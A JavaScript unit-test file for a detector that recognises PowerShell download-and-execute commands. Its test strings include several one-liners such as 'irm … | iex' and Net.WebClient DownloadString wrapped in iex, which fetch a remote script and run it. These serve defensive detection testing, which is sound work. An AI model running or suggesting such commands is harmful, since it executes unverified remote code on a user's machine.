import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  PS_DOWNLOAD_PIPE_IEX,
  PS_IEX_OF_DOWNLOAD,
  powershellDownloadExecs,
} from "./powershell-download-exec.js";

describe("powershellDownloadExecs", () => {
  it("reads a download piped into iex", () => {
    assert.deepEqual(powershellDownloadExecs("irm https://h.example/install.ps1 | iex"), [
      { download: "irm", exec: "iex", urls: ["https://h.example/install.ps1"] },
    ]);
  });

  it("reads iex over a download, and the long cmdlet names", () => {
    assert.deepEqual(powershellDownloadExecs("iex (irm https://h.example/install.ps1)"), [
      { download: "irm", exec: "iex", urls: ["https://h.example/install.ps1"] },
    ]);
    assert.deepEqual(
      powershellDownloadExecs("Invoke-WebRequest -Uri https://h.example/a.ps1 | Invoke-Expression"),
      [
        {
          download: "invoke-webrequest",
          exec: "invoke-expression",
          urls: ["https://h.example/a.ps1"],
        },
      ],
    );
  });

  it("reads Net.WebClient's DownloadString, piped or wrapped", () => {
    const piped = "(New-Object Net.WebClient).DownloadString('https://h.example/a.ps1') | iex";
    const wrapped =
      "iex ((New-Object System.Net.WebClient).DownloadString('https://h.example/a.ps1'))";
    for (const text of [piped, wrapped]) {
      assert.deepEqual(powershellDownloadExecs(text), [
        { download: "Net.WebClient", exec: "iex", urls: ["https://h.example/a.ps1"] },
      ]);
    }
  });

  it("does not read a download that is saved, or an iex of a local file", () => {
    assert.deepEqual(powershellDownloadExecs("irm https://h.example/a.ps1 -OutFile a.ps1"), []);
    assert.deepEqual(powershellDownloadExecs("iex (Get-Content ./a.ps1 -Raw)"), []);
    assert.equal(PS_DOWNLOAD_PIPE_IEX.test("firmware | iexplore"), false);
    assert.equal(PS_IEX_OF_DOWNLOAD.test("complex (irmx)"), false);
  });
});
